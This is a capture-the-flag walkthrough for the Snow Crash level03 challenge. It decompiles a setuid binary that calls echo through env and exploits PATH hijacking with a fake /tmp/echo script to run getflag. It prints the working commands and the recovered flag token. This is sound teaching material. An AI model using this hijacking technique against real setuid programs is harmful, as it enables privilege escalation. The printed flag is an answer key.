```markdown
# Snow Crash – Level03 Walkthrough

## 🧩 Challenge Overview

In **level03**, we are provided with a binary that, when executed, simply prints:

```
Exploit me
```

Our goal is to exploit its behavior to retrieve the flag using the provided `/bin/getflag` binary.

---

## 🔍 Step-by-Step Analysis

### 1. Inspect the Binary

To understand what the binary does internally, several tools were used:

#### 🧪 `ltrace`

Reveals the system call being used:

```bash
ltrace ./level03
...
system("/usr/bin/env echo Exploit me")
```

This tells us that the binary is executing a command via `system()` using `/usr/bin/env echo`.

#### 🧠 `radare2` and `Ghidra`

Decompiled with Ghidra and confirmed with radare2:

```c
int main(int argc, char **argv, char **envp)
{
  __gid_t __rgid = getegid();
  __uid_t __ruid = geteuid();

  setresgid(__rgid, __rgid, __rgid);
  setresuid(__ruid, __ruid, __ruid);

  return system("/usr/bin/env echo Exploit me");
}
```

The key takeaway is that the binary runs `echo` using `env`, which respects the current `PATH`.

---

## ⚙️ Exploitation

We exploit this by creating a fake `echo` that runs the `/bin/getflag` command.

### 1. Create Malicious `echo`

```bash
echo "/bin/getflag" > /tmp/echo
chmod +x /tmp/echo
```

### 2. Modify `$PATH`

```bash
export PATH=/tmp:$PATH
```

This places `/tmp` before `/bin` and `/usr/bin` in the lookup order, so `env` uses our malicious `echo`.

### 3. Run the Binary

```bash
./level03
```

### ✅ Output

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

## ✅ Conclusion

By abusing how `/usr/bin/env` respects the `PATH`, we were able to hijack the `echo` call and execute `/bin/getflag` instead, retrieving the flag successfully.

```
🎯 Final Flag: qi0maab88jeaj46qoumi7maus
```
